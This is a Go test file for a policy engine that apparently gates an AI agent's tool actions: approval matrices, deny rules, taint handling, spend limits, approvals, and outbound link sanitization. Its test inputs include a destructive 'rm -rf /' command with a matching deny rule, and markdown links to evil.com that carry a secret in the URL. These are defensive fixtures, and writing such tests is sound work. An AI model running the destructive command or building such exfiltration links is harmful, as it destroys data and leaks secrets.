package policy

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

func mustRules(t *testing.T, rs ...Rule) RuleSet {
	t.Helper()
	for i := range rs {
		rs[i].Enabled = true
		if rs[i].ID == "" {
			rs[i].ID = rs[i].Name
		}
	}
	set, err := CompileAll(rs)
	if err != nil {
		t.Fatal(err)
	}
	return set
}

// Die komplette Default-Matrix als Tabellen-Test (Spec 14.3).
func TestMatrix(t *testing.T) {
	e := &Engine{}
	want := map[Class][4]Verdict{
		Read:          {Ask, Allow, Allow, Allow},
		WriteInternal: {Ask, Allow, Allow, Allow},
		Compute:       {Ask, Allow, Allow, Allow},
		WriteExternal: {Ask, Ask, Review, Review},
		Communicate:   {Ask, Ask, Ask, Review},
		Destructive:   {Ask, Ask, Ask, Ask},
		Spend:         {Ask, Ask, Ask, Ask},
		Credential:    {HumanOnly, HumanOnly, HumanOnly, HumanOnly},
		Laptop:        {Ask, Ask, Ask, Ask},
	}
	for cls, levels := range want {
		for l, v := range levels {
			d := e.Evaluate(Action{Tool: "x", Class: cls}, Context{Autonomy: l, Scope: ScopeFull})
			if d.Verdict != v {
				t.Errorf("%s L%d: got %s want %s", cls, l, d.Verdict, v)
			}
			if cls == Spend && !d.StepUp {
				t.Errorf("spend L%d ohne step-up", l)
			}
		}
	}
}

func TestReadonlyScopeIsHard(t *testing.T) {
	// Selbst eine allow-Regel öffnet im Pulse keine Schreibtools.
	e := &Engine{Rules: mustRules(t, Rule{Name: "allow-all", Expr: "true", Effect: EffectAllow, AllowWhenTainted: true})}
	for _, c := range []Class{WriteExternal, Communicate, Spend, Destructive, Compute, Laptop} {
		d := e.Evaluate(Action{Tool: "x", Class: c}, Context{Autonomy: 3, Scope: ScopeReadonly, Trigger: "pulse"})
		if d.Verdict != Deny {
			t.Errorf("readonly %s: %s", c, d.Verdict)
		}
	}
	if d := e.Evaluate(Action{Tool: "mail.list", Class: Read}, Context{Autonomy: 1, Scope: ScopeReadonly}); d.Verdict != Allow {
		t.Errorf("read im pulse: %s", d.Verdict)
	}
}

func TestCredentialAlwaysHuman(t *testing.T) {
	e := &Engine{Rules: mustRules(t, Rule{Name: "allow-all", Expr: "true", Effect: EffectAllow})}
	d := e.Evaluate(Action{Tool: "account.change_password", Class: Credential}, Context{Autonomy: 3, Scope: ScopeFull})
	if d.Verdict != HumanOnly {
		t.Fatal(d.Verdict)
	}
}

func TestDenyRuleBeatsEverything(t *testing.T) {
	e := &Engine{Rules: mustRules(t,
		Rule{Name: "rmrf", Expr: `action.tool.startsWith("shell.") && action.args.cmd.matches("(?i)rm\\s+-rf\\s+/")`, Effect: EffectDeny},
		Rule{Name: "allow-shell", Expr: `action.tool == "shell.run"`, Effect: EffectAllow, Priority: 100},
	)}
	d := e.Evaluate(Action{Tool: "shell.run", Class: Compute, Args: map[string]any{"cmd": "rm -rf /"}}, Context{Autonomy: 3, Scope: ScopeFull})
	if d.Verdict != Deny {
		t.Fatal(d.Verdict)
	}
	d = e.Evaluate(Action{Tool: "shell.run", Class: Compute, Args: map[string]any{"cmd": "ls"}}, Context{Autonomy: 0, Scope: ScopeFull})
	if d.Verdict != Allow {
		t.Fatalf("allow-regel sollte L0-ask überschreiben: %s", d.Verdict)
	}
}

func TestSpecExampleRules(t *testing.T) {
	e := &Engine{Rules: mustRules(t,
		Rule{Name: "kalender", Effect: EffectAllow, Expr: `action.tool == "calendar.respond" && action.args.response == "accept"
			&& action.args.duration_minutes <= 60 && action.args.organizer in contacts.known`},
		Rule{Name: "extern-mail", Effect: EffectAsk, Expr: `action.tool == "mail.send" && !action.target.recipients.all(r, r.endsWith("@meinefirma.de"))`},
		Rule{Name: "intern-mail", Effect: EffectAllow, Priority: -1, Expr: `action.tool == "mail.send"`},
	)}
	ctx := Context{Autonomy: 1, Scope: ScopeFull, KnownContacts: []string{"anna@x.de"}}
	cal := Action{Tool: "calendar.respond", Class: WriteExternal, Args: map[string]any{"response": "accept", "duration_minutes": 30, "organizer": "anna@x.de"}}
	if d := e.Evaluate(cal, ctx); d.Verdict != Allow {
		t.Errorf("kalender: %s %v", d.Verdict, d.Reasons)
	}
	cal.Args["organizer"] = "fremd@y.de"
	if d := e.Evaluate(cal, ctx); d.Verdict != Ask {
		t.Errorf("kalender fremd: %s", d.Verdict)
	}
	// Fehlender Schlüssel → Regel greift nicht → Matrix.
	if d := e.Evaluate(Action{Tool: "calendar.respond", Class: WriteExternal, Args: map[string]any{}}, ctx); d.Verdict != Ask {
		t.Errorf("fehlende args: %s", d.Verdict)
	}
	mail := Action{Tool: "mail.send", Class: Communicate, Recipients: []string{"a@meinefirma.de", "b@evil.com"}}
	if d := e.Evaluate(mail, ctx); d.Verdict != Ask {
		t.Errorf("extern: %s", d.Verdict)
	}
	mail.Recipients = []string{"a@meinefirma.de"}
	if d := e.Evaluate(mail, ctx); d.Verdict != Allow {
		t.Errorf("intern: %s %v", d.Verdict, d.Reasons)
	}
}

func TestTaint(t *testing.T) {
	rules := mustRules(t,
		Rule{Name: "mail-ok", Expr: `action.tool == "mail.send"`, Effect: EffectAllow},
		Rule{Name: "issue-ok", Expr: `action.tool == "github.create_issue"`, Effect: EffectAllow, AllowWhenTainted: true},
	)
	e := &Engine{Rules: rules}
	tc := Context{Autonomy: 3, Scope: ScopeFull, Tainted: true}
	if d := e.Evaluate(Action{Tool: "mail.send", Class: Communicate}, tc); d.Verdict != Ask {
		t.Errorf("getaintet mail: %s", d.Verdict)
	}
	if d := e.Evaluate(Action{Tool: "github.create_issue", Class: WriteExternal}, tc); d.Verdict != Allow {
		t.Errorf("allow_when_tainted: %s", d.Verdict)
	}
	// Review (L3 write_external) wird im getainteten Run zu Ask.
	if d := (&Engine{}).Evaluate(Action{Tool: "x", Class: WriteExternal}, tc); d.Verdict != Ask {
		t.Errorf("review tainted: %s", d.Verdict)
	}
	// Neue Egress-Domain im getainteten Run.
	tc.UsedEgressDomains = []string{"api.github.com"}
	d := e.Evaluate(Action{Tool: "github.create_issue", Class: WriteExternal, EgressDomains: []string{"evil.example"}}, tc)
	if d.Verdict != Ask {
		t.Errorf("neue domain: %s", d.Verdict)
	}
	// Lesen bleibt erlaubt.
	if d := e.Evaluate(Action{Tool: "web.fetch", Class: Read}, tc); d.Verdict != Allow {
		t.Errorf("read tainted: %s", d.Verdict)
	}
}

func TestSpendRuleOnlyAtL3(t *testing.T) {
	e := &Engine{Rules: mustRules(t, Rule{Name: "kleinbetraege", Expr: `action.class == "spend" && action.amount_micro_eur <= 5000000`, Effect: EffectAllow})}
	a := Action{Tool: "pay", Class: Spend, AmountMicroEUR: 1000000}
	if d := e.Evaluate(a, Context{Autonomy: 2, Scope: ScopeFull}); d.Verdict != Ask || !d.StepUp {
		t.Errorf("L2 spend: %+v", d)
	}
	if d := e.Evaluate(a, Context{Autonomy: 3, Scope: ScopeFull}); d.Verdict != Allow {
		t.Errorf("L3 spend: %+v", d)
	}
	a.AmountMicroEUR = 9000000
	if d := e.Evaluate(a, Context{Autonomy: 3, Scope: ScopeFull}); d.Verdict != Ask || !d.StepUp {
		t.Errorf("L3 spend über limit: %+v", d)
	}
}

func TestFourEyesAndUnknownClass(t *testing.T) {
	e := &Engine{Rules: mustRules(t, Rule{Name: "big", Expr: `action.tool == "bank.transfer"`, Effect: EffectAsk, FourEyes: true})}
	d := e.Evaluate(Action{Tool: "bank.transfer", Class: Spend}, Context{Autonomy: 3, Scope: ScopeFull})
	if d.RequiredApprovals != 2 {
		t.Fatal("vier-augen fehlt")
	}
	d = e.Evaluate(Action{Tool: "mcp.foo", Class: "weird"}, Context{Autonomy: 1, Scope: ScopeFull})
	if d.Verdict != Ask {
		t.Fatalf("unbekannte klasse: %s", d.Verdict)
	}
}

func TestToolAllowlistAndScopeSubset(t *testing.T) {
	e := &Engine{}
	c := Context{Autonomy: 3, Scope: ScopeFull, ToolAllowlist: []string{"web.*", "fs.write"}}
	if d := e.Evaluate(Action{Tool: "web.fetch", Class: Read}, c); d.Verdict != Allow {
		t.Error(d.Verdict)
	}
	if d := e.Evaluate(Action{Tool: "shell.run", Class: Compute}, c); d.Verdict != Deny {
		t.Error(d.Verdict)
	}
	if !ScopeSubset([]string{"web.search", "fs.write"}, []string{"web.*", "fs.write"}) {
		t.Error("subset")
	}
	if ScopeSubset([]string{"shell.run"}, []string{"web.*"}) || ScopeSubset(nil, []string{"web.*"}) || ScopeSubset([]string{"fs.*"}, []string{"fs.read"}) {
		t.Error("kein subset akzeptiert")
	}
	if IntersectScope(ScopeReadonly, ScopeFull) != ScopeReadonly || IntersectScope(ScopeFull, ScopeNone) != ScopeNone {
		t.Error("intersect")
	}
}

func TestBadRulesRejected(t *testing.T) {
	for _, r := range []Rule{
		{Name: "syntax", Expr: "action.tool ==", Effect: EffectAllow},
		{Name: "type", Expr: `"x"`, Effect: EffectAllow},
		{Name: "effect", Expr: "true", Effect: "maybe"},
	} {
		if _, err := Compile(r); err == nil {
			t.Errorf("%s akzeptiert", r.Name)
		}
	}
}

func TestApprovalLifecycle(t *testing.T) {
	now := time.Date(2026, 10, 1, 9, 0, 0, 0, time.UTC)
	a := &Approval{Status: Pending, RequiredApprovals: 2, ExpiresAt: now.Add(time.Hour)}
	if final, err := a.Resolve(Resolution{UserID: "u1", Approve: true, Now: now}); final || err != nil {
		t.Fatal(final, err)
	}
	if _, err := a.Resolve(Resolution{UserID: "u1", Approve: true, Now: now}); !errors.Is(err, ErrSameUser) {
		t.Fatal(err)
	}
	if final, err := a.Resolve(Resolution{UserID: "u2", Approve: true, Now: now}); !final || err != nil || a.Status != Approved {
		t.Fatal(final, err, a.Status)
	}
	if _, err := a.Resolve(Resolution{UserID: "u3", Approve: false, Now: now}); !errors.Is(err, ErrNotPending) {
		t.Fatal(err)
	}
	b := &Approval{Status: Pending, StepUp: true, ExpiresAt: now.Add(time.Hour)}
	if _, err := b.Resolve(Resolution{UserID: "u1", Approve: true, Now: now}); !errors.Is(err, ErrStepUp) {
		t.Fatal(err)
	}
	if !b.Expire(now.Add(2*time.Hour)) || b.Status != Expired || !strings.Contains(b.ToolResultText(), "abgelaufen") {
		t.Fatal("expire")
	}
}

type fakeReviewer struct {
	out string
	err error
	d   time.Duration
}

func (f fakeReviewer) Review(ctx context.Context, _ ReviewInput) (json.RawMessage, error) {
	select {
	case <-time.After(f.d):
	case <-ctx.Done():
		return nil, ctx.Err()
	}
	return json.RawMessage(f.out), f.err
}

func TestAutoReviewFailClosed(t *testing.T) {
	cases := []struct {
		r    Reviewer
		want Verdict
	}{
		{fakeReviewer{out: `{"verdict":"allow","reasons":["ok"],"risk":"low"}`}, Allow},
		{fakeReviewer{out: "```json\n{\"verdict\":\"deny\",\"reasons\":[],\"risk\":\"high\"}\n```"}, Deny},
		{fakeReviewer{out: `{"verdict":"allow","reasons":[],"risk":"high"}`}, Ask},
		{fakeReviewer{out: `{"verdict":"yes"}`}, Ask},
		{fakeReviewer{out: `garbage`}, Ask},
		{fakeReviewer{out: `{"verdict":"allow","reasons":[],"risk":"low","extra":1}`}, Ask},
		{fakeReviewer{err: errors.New("boom")}, Ask},
		{fakeReviewer{out: `{"verdict":"allow","reasons":[],"risk":"low"}`, d: time.Second}, Ask},
		{nil, Ask},
	}
	for i, c := range cases {
		if v, _ := RunReview(context.Background(), c.r, ReviewInput{}, 50*time.Millisecond); v != c.want {
			t.Errorf("case %d: %s want %s", i, v, c.want)
		}
	}
}

func TestSanitizeOutbound(t *testing.T) {
	in := "Hier ![x](https://evil.com/p.png?d=SECRET) und [klick](https://evil.com/?q=SECRET) sowie https://a.com/x?y=SECRET und ![ok](https://cdn.fylgja.local/a.png)"
	out := SanitizeOutbound(in, true, []string{"cdn.fylgja.local"})
	if strings.Contains(out, "SECRET") {
		t.Fatal(out)
	}
	if !strings.Contains(out, "cdn.fylgja.local/a.png") {
		t.Fatal("erlaubtes bild entfernt")
	}
	clean := SanitizeOutbound("[doc](https://x.com/?a=1)", false, nil)
	if !strings.Contains(clean, "a=1") {
		t.Fatal("ungetainteter link entfernt")
	}
}

func TestSimulate(t *testing.T) {
	rules := mustRules(t, Rule{Name: "block-mail", Expr: `action.tool == "mail.send"`, Effect: EffectDeny})
	res := Simulate(rules, []HistoricalAction{
		{ID: "1", Action: Action{Tool: "mail.send", Class: Communicate}, Context: Context{Autonomy: 3, Scope: ScopeFull}, Previous: Review},
		{ID: "2", Action: Action{Tool: "web.fetch", Class: Read}, Context: Context{Autonomy: 1, Scope: ScopeFull}, Previous: Allow},
	})
	if !res[0].Changed || res[0].Now.Verdict != Deny || res[1].Changed {
		t.Fatalf("%+v", res)
	}
}
